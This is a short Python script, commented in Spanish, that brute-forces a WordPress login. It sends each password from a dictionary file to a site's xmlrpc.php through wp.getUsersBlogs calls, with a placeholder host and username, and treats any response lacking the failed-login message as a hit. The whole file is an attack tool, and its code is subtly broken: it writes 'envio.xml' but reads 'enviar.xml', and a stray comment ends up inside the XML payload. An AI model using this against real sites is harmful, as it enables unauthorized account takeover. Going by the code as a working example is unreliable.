import os
import requests
import signal
import time	

def salir(signal, frame):
    exit(1)

signal.signal(signal.SIGINT, salir)
diccionario = "diccionario.txt"  # Ruta del archivo de diccionario

with open(diccionario, "r") as file:
    for password in file:
        password = password.strip()

        variable = '''<?xml version="1.0" encoding="iso-8859-1"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>usuario</value></param> #aquí debes de ingresar el nombre de usuario que sepas que existe en WordPress
                <param><value>{}</value></param>
            </params>
        </methodCall>
        '''.format(password)

        with open("envio.xml", "w") as xml_file:
            xml_file.write(variable)

        print("[+] Probamos con la contraseña", password)

        url = 'https://ipdelamaquina/xmlrpc.php'
        headers = {'Content-Type': 'application/xml'}
        data = open("enviar.xml", "rb").read()

        response = requests.post(url, data=data, headers=headers)

        with open("envio.log", "a") as log_file:
            log_file.write(response.text)

        if 'Nombre de usuario o contraseña incorrectos.' in response.text: #esto tambien puede ser 'Incorrect username or password.'
            print("[-] La Contraseña utilizada, es incorrecta:", password)
        else:
            print("[+] La contraseña para, Usuario, es:", password)
            exit(0)

        time.sleep(1)

        os.remove("envio.log")
        os.remove("envio.xml")
